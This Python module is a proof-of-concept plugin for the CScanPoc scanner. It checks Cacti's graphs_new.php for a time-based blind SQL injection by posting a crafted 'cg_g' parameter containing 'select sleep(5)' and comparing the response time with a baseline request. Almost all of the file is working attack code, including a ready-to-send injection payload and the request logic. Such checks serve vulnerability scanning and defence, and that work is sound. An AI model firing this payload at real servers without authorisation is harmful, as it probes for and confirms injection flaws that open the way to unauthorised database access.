# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Cacti_0002'  # 平台漏洞编号
    name = 'Cacti SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-01-16'  # 漏洞公布时间
    desc = '''
        Cacti是一套网络流量监测图形分析工具。它有非常强大的数据和用户管理功能，可以指定每一个用户能查看树状结 构、host以及任何一张图，还可以与LDAP结合进行用户验证，同时也能自己增加模板，功能非常强大。
        graphs_new.php 中函数参数过滤不严谨，导致注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3713/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Cacti'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '88910a48-1fe6-4a87-b089-7a735613708e'  # 平台 POC 编号
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/cacti/graphs_new.php'
            url = self.target + payload
            data_sleep = "__csrf_magic=sid%3Aed226a87fdcc8e055d1c27b620e564d629d95e40%2C1450241184&cg_g=033926697+xor+(select(0)from(select sleep(5))v)&save_component_graph=1&host_id=2&host_template_id=0&action=save"
            data_normal = "__csrf_magic=sid%3Aed226a87fdcc8e055d1c27b620e564d629d95e40%2C1450241184&cg_g=033926697+xor+(select(0)from(select md5(c))v)&save_component_graph=1&host_id=2&host_template_id=0&action=save"
            time_start = time.time()
            requests.post(url, data_normal)
            time_end_normal = time.time()
            requests.post(url, data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal)-(time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url};具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name,url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
